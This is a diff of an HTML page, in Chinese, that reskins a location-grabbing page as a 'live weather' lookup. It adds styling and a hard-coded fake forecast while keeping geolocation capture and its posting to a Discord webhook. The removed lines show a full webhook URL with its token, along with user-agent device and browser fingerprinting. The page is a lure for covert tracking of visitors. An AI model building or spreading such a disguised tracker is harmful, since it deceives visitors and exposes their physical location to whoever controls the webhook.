@@ -2,43 +2,68 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>內容載入中</title>
+<title>即時天氣</title>
+
+<style>
+body{
+font-family: Arial;
+background: linear-gradient(#6ec6ff,#b3e5fc);
+text-align:center;
+padding-top:80px;
+}
+
+.weather-box{
+background:white;
+width:300px;
+margin:auto;
+padding:20px;
+border-radius:15px;
+box-shadow:0 5px 20px rgba(0,0,0,0.2);
+}
+
+button{
+padding:10px 20px;
+font-size:16px;
+border:none;
+border-radius:10px;
+background:#2196f3;
+color:white;
+cursor:pointer;
+}
+
+button:hover{
+background:#1976d2;
+}
+
+#status{
+margin-top:20px;
+font-size:18px;
+}
+</style>
+
 </head>
 
 <body>
 
-<h2>點擊按鈕查看內容</h2>
-<button onclick="getLocation()">點擊載入</button>
+<div class="weather-box">
+
+<h2>🌤 即時天氣查詢</h2>
+
+<p>點擊按鈕查看目前天氣</p>
+
+<button onclick="getLocation()">查看天氣</button>
 
 <p id="status"></p>
 
+</div>
+
 <script>
 
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
-var ua = navigator.userAgent;
-var device = "Unknown Device";
+var webhook = "你的webhook";
 
-if(/iPhone/i.test(ua)){
-device = "iPhone";
-}
-else if(/iPad/i.test(ua)){
-device = "iPad";
-}
-else if(/Android/i.test(ua)){
-device = "Android Device";
-}
-
-var browser = "Unknown Browser";
-
-if(ua.indexOf("Chrome")>-1){
-browser = "Chrome";
-}
-else if(ua.indexOf("Safari")>-1){
-browser = "Safari";
-}
 function getLocation(){
 
-document.getElementById("status").innerHTML="正在取得位置...";
+document.getElementById("status").innerHTML="正在取得天氣資料...";
 
 if(navigator.geolocation){
 
@@ -49,7 +74,9 @@ maximumAge:0
 });
 
 }else{
+
 document.getElementById("status").innerHTML="瀏覽器不支援定位";
+
 }
 
 }
@@ -76,12 +103,16 @@ content:
 });
 
 document.getElementById("status").innerHTML=
-"晴天☀️！<br>" 
+"☀️ 晴天<br>"+
+"🌡 溫度：26°C<br>"+
+"🌬 微風<br>"+
+"📍目前位置天氣";
+
 }
 
-function error(err){
+function error(){
 
-document.getElementById("status").innerHTML="需要允許定位才能查看內容";
+document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
 
 }
 
